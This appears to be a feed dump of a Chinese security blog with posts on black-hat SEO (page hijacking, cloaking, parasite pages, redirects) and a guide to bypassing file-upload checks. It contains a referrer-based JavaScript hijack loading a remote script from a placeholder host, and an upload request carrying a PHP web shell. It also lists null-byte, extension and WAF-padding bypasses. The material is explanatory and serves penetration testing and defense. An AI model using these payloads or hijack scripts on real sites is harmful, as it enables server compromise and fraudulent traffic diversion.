<h4 id="js劫持案例"><a href="#js劫持案例" class="headerlink" title="js劫持案例"></a>js劫持案例</h4><p>效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">today=new Date();</div><div class="line">today=today.getYear()+<span class="string">"-"</span>+(today.getMonth()+1)+<span class="string">"-"</span>+today.getDate();</div><div class="line">var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;</div><div class="line">var <span class="built_in">where</span> =document.referer;</div><div class="line"><span class="keyword">if</span>(regexp.test(<span class="built_in">where</span>))&#123;</div><div class="line">document.write (<span class="string">'&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">window.location.href=<span class="string">"../../404.htm"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>
<h4 id="header劫持"><a href="#header劫持" class="headerlink" title="header劫持"></a>header劫持</h4><p>在源代码中写入以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=“refresh“ content=“10; url=http://thief.one“&gt;</div></pre></td></tr></table></figure></p>
<p>利用的就是Meta Refresh Tag（自动转向），将流量引走。</p>
<h3 id="手法对比"><a href="#手法对比" class="headerlink" title="手法对比"></a>手法对比</h3><h4 id="客户端劫持与服务端区别"><a href="#客户端劫持与服务端区别" class="headerlink" title="客户端劫持与服务端区别"></a>客户端劫持与服务端区别</h4><p>客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。<br>服务端劫持：改变了每次访问网页从服务端获取到的网页代码。</p>
<h4 id="客户端劫持与服务端判断方法"><a href="#客户端劫持与服务端判断方法" class="headerlink" title="客户端劫持与服务端判断方法"></a>客户端劫持与服务端判断方法</h4><p>客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。<br>服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。</p>
<p>结语：<em>网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。</em></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之页面跳转]]></title>
      <url>http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</url>
      <content type="html"><![CDATA[<p>　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：<a href="http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">黑帽SEO–基础知识</a>）其中页面跳转便是作弊手法之一，最近我收集了一些关于<em>页面跳转</em>的相关内容，在此汇总分享。<br><a id="more"></a></p>
<h3 id="页面跳转分类"><a href="#页面跳转分类" class="headerlink" title="页面跳转分类"></a>页面跳转分类</h3><h4 id="（一）服务端跳转"><a href="#（一）服务端跳转" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。</p>
<h4 id="（二）客户端跳转"><a href="#（二）客户端跳转" class="headerlink" title="（二）客户端跳转"></a>（二）客户端跳转</h4><p>客户端跳转分为：http层跳转，应用层跳转。<br>应用层跳转分为：html head跳转，js跳转等。</p>
<h5 id="http层跳转"><a href="#http层跳转" class="headerlink" title="http层跳转"></a>http层跳转</h5><p>　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。</p>
<h5 id="html-head跳转（HTML-refresh）"><a href="#html-head跳转（HTML-refresh）" class="headerlink" title="html head跳转（HTML refresh）"></a>html head跳转（HTML refresh）</h5><p>在html代码的head中添加特殊标签，如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"5"</span>; url=<span class="string">"http://thief.one/"</span> /&gt;</div></pre></td></tr></table></figure></p>
<p>表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。</p>
<h5 id="js跳转"><a href="#js跳转" class="headerlink" title="js跳转"></a>js跳转</h5><p>通过在html代码中添加js代码，通过js代码实现跳转：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">window.location.href=<span class="string">"http://thief.one"</span>;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>这个跳转应该比html head跳转更向后延迟。</p>
<h4 id="各种跳转包含关系"><a href="#各种跳转包含关系" class="headerlink" title="各种跳转包含关系"></a>各种跳转包含关系</h4><ul>
<li>服务端跳转</li>
<li>客户端跳转<ul>
<li>http跳转</li>
<li>应用层跳转<ul>
<li>html head跳转</li>
<li>html js跳转</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><hr></p>
<h3 id="各种跳转介绍"><a href="#各种跳转介绍" class="headerlink" title="各种跳转介绍"></a>各种跳转介绍</h3><h4 id="（一）服务端跳转-1"><a href="#（一）服务端跳转-1" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>介绍：跳转发生在服务器上，用户不会有任何感觉。<br>优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。<br>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。</p>
<h4 id="（二）http跳转"><a href="#（二）http跳转" class="headerlink" title="（二）http跳转"></a>（二）http跳转</h4><p>介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。<br>优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。<br>缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。</p>
<h4 id="（三）html-head跳转"><a href="#（三）html-head跳转" class="headerlink" title="（三）html head跳转"></a>（三）html head跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>
<h4 id="（四）-js跳转"><a href="#（四）-js跳转" class="headerlink" title="（四） js跳转"></a>（四） js跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>
<p>参考文章：<a href="http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html" target="_blank" rel="external">http://www.iigrowing.cn/</a><br>欢迎留言交流补充!</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之基础知识]]></title>
      <url>http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<p>　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br><a id="more"></a>　 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。<br>　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！</p>
<h3 id="黑帽SEO基础概念"><a href="#黑帽SEO基础概念" class="headerlink" title="黑帽SEO基础概念"></a>黑帽SEO基础概念</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。</p>
<blockquote>
<h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a>顶级域名</h5><p>我们接触的顶级域名又分为两类：<br>1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；<br>2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。</p>
<h5 id="一级域名"><a href="#一级域名" class="headerlink" title="一级域名"></a>一级域名</h5><p>一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。</p>
<h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h5><p>news.baidu.com，tieba.baidu.com等都是二级域名。</p>
</blockquote>
<h4 id="泛站群"><a href="#泛站群" class="headerlink" title="泛站群"></a>泛站群</h4><h5 id="泛二级域名站群"><a href="#泛二级域名站群" class="headerlink" title="泛二级域名站群"></a>泛二级域名站群</h5><p><img src="/upload_image/20161009/2.png" alt=""><br>前提：在做域名解析的时候，选择了*<br>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。</p>
<h5 id="泛端口站群"><a href="#泛端口站群" class="headerlink" title="泛端口站群"></a>泛端口站群</h5><p><img src="/upload_image/20161009/1.png" alt=""><br>操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</p>
<h4 id="站中站"><a href="#站中站" class="headerlink" title="站中站"></a>站中站</h4><p>　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p>
<h4 id="链轮"><a href="#链轮" class="headerlink" title="链轮"></a>链轮</h4><p><img src="/upload_image/20161009/3.png" alt=""><br>　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p>
<h4 id="蜘蛛池"><a href="#蜘蛛池" class="headerlink" title="蜘蛛池"></a>蜘蛛池</h4><p>　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p>
<h4 id="寄生虫"><a href="#寄生虫" class="headerlink" title="寄生虫"></a>寄生虫</h4><p>　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p>
<p><hr></p>
<h3 id="黑帽SEO作弊手法"><a href="#黑帽SEO作弊手法" class="headerlink" title="黑帽SEO作弊手法"></a>黑帽SEO作弊手法</h3><p>SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。</p>
<h4 id="PR劫持"><a href="#PR劫持" class="headerlink" title="PR劫持"></a>PR劫持</h4><p>　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。<br>　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p>
<h4 id="网站跳转"><a href="#网站跳转" class="headerlink" title="网站跳转"></a>网站跳转</h4><p>详细参考：<a href="http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/">黑帽SEO之页面跳转</a></p>
<h4 id="隐藏页面"><a href="#隐藏页面" class="headerlink" title="隐藏页面"></a>隐藏页面</h4><p>　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。</p>
<h4 id="隐藏文字"><a href="#隐藏文字" class="headerlink" title="隐藏文字"></a>隐藏文字</h4><p>　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"display:none"</span>&gt;隐藏文字&lt;/div&gt;</div><div class="line">positon:absolute;</div><div class="line">margin-right:-1000000px;</div></pre></td></tr></table></figure></p>
<h4 id="垃圾连接"><a href="#垃圾连接" class="headerlink" title="垃圾连接"></a>垃圾连接</h4><p>　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。</p>
<h4 id="连接农场"><a href="#连接农场" class="headerlink" title="连接农场"></a>连接农场</h4><p>　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。</p>
<h4 id="桥页"><a href="#桥页" class="headerlink" title="桥页"></a>桥页</h4><p>　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。</p>
<ul>
<li>页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。</li>
<li>利用页面自动跳转技术。</li>
</ul>
<h4 id="关键词堆积"><a href="#关键词堆积" class="headerlink" title="关键词堆积"></a>关键词堆积</h4><p>关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。</p>
<h4 id="诱饵替换"><a href="#诱饵替换" class="headerlink" title="诱饵替换"></a>诱饵替换</h4><p>诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。</p>
<h4 id="刷站"><a href="#刷站" class="headerlink" title="刷站"></a>刷站</h4><p>刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。</p>
<h4 id="挂暗链（黑链）"><a href="#挂暗链（黑链）" class="headerlink" title="挂暗链（黑链）"></a>挂暗链（黑链）</h4><p>手法：利用CSS，利用DIV+JS，利用JS等<br>作用：利用高权重网站外链来提升自身站点排名。<br>详细参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">黑帽SEO之暗链</a></p>
<h4 id="网站劫持"><a href="#网站劫持" class="headerlink" title="网站劫持"></a>网站劫持</h4><p>分类：客户端劫持，服务端劫持，快照劫持等<br>手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。<br>作用：利用高权重网站跳转来引流量。<br>详细参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/">黑帽SEO之网页劫持</a></p>
<h4 id="利用高权重网站二级目录"><a href="#利用高权重网站二级目录" class="headerlink" title="利用高权重网站二级目录"></a>利用高权重网站二级目录</h4><p>手法：将一些博彩网页放在高权重网站的二级目录之下。<br>作用：提高网站排名，引流量。</p>
<h4 id="利用高权重网站二级目录反向代理"><a href="#利用高权重网站二级目录反向代理" class="headerlink" title="利用高权重网站二级目录反向代理"></a>利用高权重网站二级目录反向代理</h4><p>　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。<br>　 即浏览者在打开<em><a href="http://thief.one/2016/">http://thief.one/2016/</a></em>目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。</p>
<p><em>持续更新…….</em></p>
<p>参考：黑帽SEO论坛、SEO实战密码</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[文件上传漏洞（绕过姿势）]]></title>
      <url>http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</url>
      <content type="html"><![CDATA[<p>　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）<br><a id="more"></a></p>
<h3 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h3><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h4 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1.客户端校验"></a>1.客户端校验</h4><p>　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br>　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
<h4 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2.服务端校验"></a>2.服务端校验</h4><h5 id="2-1-content-type字段校验"><a href="#2-1-content-type字段校验" class="headerlink" title="2.1 content-type字段校验"></a>2.1 content-type字段校验</h5><p>　　这里以PHP代码为例，模拟web服务器端的校验代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></div><div class="line">                &#123;   </div><div class="line">                 <span class="built_in">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</div><div class="line">                 <span class="built_in">exit</span>;</div><div class="line">                 &#125;</div><div class="line">         <span class="variable">$uploaddir</span> = <span class="string">'uploads/'</span>;</div><div class="line">         <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</div><div class="line">         <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$uploadfile</span>))</div><div class="line">             &#123;</div><div class="line">                 <span class="built_in">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                     <span class="built_in">echo</span> <span class="string">"File uploading failed.\n"</span>;</div><div class="line">    &#125;</div><div class="line">     ?&gt;</div></pre></td></tr></table></figure></p>
<p>　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<h5 id="2-2-文件头校验"><a href="#2-2-文件头校验" class="headerlink" title="2.2 文件头校验"></a>2.2 文件头校验</h5><p>　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2）  .gif，”GIF 89A”<br>（3）  .zip，”Zip Compressed”<br>（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
<p><hr></p>
<h3 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h3><ul>
<li>客户端绕过（抓包改包）</li>
<li>服务端绕过<ul>
<li>文件类型</li>
<li>文件头</li>
<li>文件后缀名</li>
</ul>
</li>
<li>配合文件包含漏洞绕过</li>
<li>配合服务器解析漏洞绕过</li>
<li>CMS、编辑器漏洞绕过</li>
<li>配合操作系统文件命名规则绕过</li>
<li>配合其他规则绕过</li>
<li>WAF绕过</li>
</ul>
<h4 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1.客户端绕过"></a>1.客户端绕过</h4><p>　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h4 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h4><h5 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h5><p>　　我们可以通过抓包，将content-type字段改为image/gif<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /upload.php HTTP/1.1</div><div class="line">TE: deflate,gzip;q=0.3</div><div class="line">Connection: TE, close</div><div class="line">Host: localhost</div><div class="line">User-Agent: libwww-perl/5.803</div><div class="line">Content-Type: multipart/form-data; boundary=xYzZY</div><div class="line">Content-Length: 155</div><div class="line">--xYzZY</div><div class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></div><div class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</div><div class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">'command'</span>]);?&gt;</div><div class="line">--xYzZY-</div></pre></td></tr></table></figure></p>
<h5 id="2-2-文件头绕过"><a href="#2-2-文件头绕过" class="headerlink" title="2.2 文件头绕过"></a>2.2 文件头绕过</h5><p>　　在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
<h5 id="2-3-文件后缀名绕过"><a href="#2-3-文件后缀名绕过" class="headerlink" title="2.3 文件后缀名绕过"></a>2.3 文件后缀名绕过</h5><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp  jspx  jspf<br>asp  asa  cer  aspx<br>php  php  php3  php4<br>exe  exee</p>
<h4 id="3-配合文件包含漏洞"><a href="#3-配合文件包含漏洞" class="headerlink" title="3.配合文件包含漏洞"></a>3.配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#PHP    </span></div><div class="line">&lt;?php Include(<span class="string">"上传的txt文件路径"</span>);?&gt; </div><div class="line"><span class="comment">#ASP    </span></div><div class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></div><div class="line"><span class="comment">#JSP    </span></div><div class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</div><div class="line">or  </div><div class="line">&lt;%@include file=<span class="string">"上传的txt文件路径"</span>%&gt;</div></pre></td></tr></table></figure></p>
<h4 id="4-配合服务器解析漏洞"><a href="#4-配合服务器解析漏洞" class="headerlink" title="4.配合服务器解析漏洞"></a>4.配合服务器解析漏洞</h4><p>详细可参考：<a href="http://thief.one/2016/09/21/服务器解析漏洞/">http://thief.one/2016/09/21/服务器解析漏洞/</a></p>
<h4 id="5-配合操作系统文件命令规则"><a href="#5-配合操作系统文件命令规则" class="headerlink" title="5.配合操作系统文件命令规则"></a>5.配合操作系统文件命令规则</h4><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<h4 id="6-CMS、编辑器漏洞"><a href="#6-CMS、编辑器漏洞" class="headerlink" title="6.CMS、编辑器漏洞"></a>6.CMS、编辑器漏洞</h4><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
<h4 id="7-配合其他规则"><a href="#7-配合其他规则" class="headerlink" title="7.配合其他规则"></a>7.配合其他规则</h4><p>（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg<br>伪代码演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</div><div class="line"><span class="built_in">type</span> =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</div><div class="line"><span class="keyword">if</span>(<span class="built_in">type</span> == jpg)</div><div class="line">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</div><div class="line">//最后以 help.asp 存入路径里</div></pre></td></tr></table></figure></p>
<h4 id="8-WAF绕过"><a href="#8-WAF绕过" class="headerlink" title="8.WAF绕过"></a>8.WAF绕过</h4><h5 id="8-1-垃圾数据"><a href="#8-1-垃圾数据" class="headerlink" title="8.1 垃圾数据"></a>8.1 垃圾数据</h5><p>　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/upload_image/20160922/1.png" alt=""><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/upload_image/20160922/2.png" alt=""><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
